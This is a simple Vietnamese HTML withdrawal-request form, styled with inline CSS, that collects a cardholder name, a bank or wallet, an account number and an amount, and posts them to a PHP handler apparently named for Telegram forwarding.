<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yêu Cầu Rút Tiền</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .form-container {
            background: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #555;
        }
        input, select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>

<div class="form-container">
    <h2>Yêu Cầu Rút Tiền</h2>
    <form action="send_telegram.php" method="POST">
        <div class="form-group">
            <label for="fullname">Họ và tên chủ thẻ:</label>
            <input type="text" id="fullname" name="fullname" placeholder="NGUYEN VAN A" required>
        </div>

        <div class="form-group">
            <label for="bank">Ngân hàng:</label>
            <select id="bank" name="bank" required>
                <option value="">-- Chọn ngân hàng --</option>
                <option value="Vietcombank">Vietcombank</option>
                <option value="Techcombank">Techcombank</option>
                <option value="MB Bank">MB Bank</option>
                <option value="Vietinbank">Vietinbank</option>
                <option value="Momo">Ví MoMo</option>
            </select>
        </div>

        <div class="form-group">
            <label for="account_number">Số tài khoản / Số điện thoại:</label>
            <input type="text" id="account_number" name="account_number" placeholder="Nhập số tài khoản" required>
        </div>

        <div class="form-group">
            <label for="amount">Số tiền muốn rút (VND):</label>
            <input type="number" id="amount" name="amount" min="10000" placeholder="Ví dụ: 100000" required>
        </div>

        <button type="submit">Xác Nhận Rút Tiền</button>
    </form>
</div>

</body>
</html>
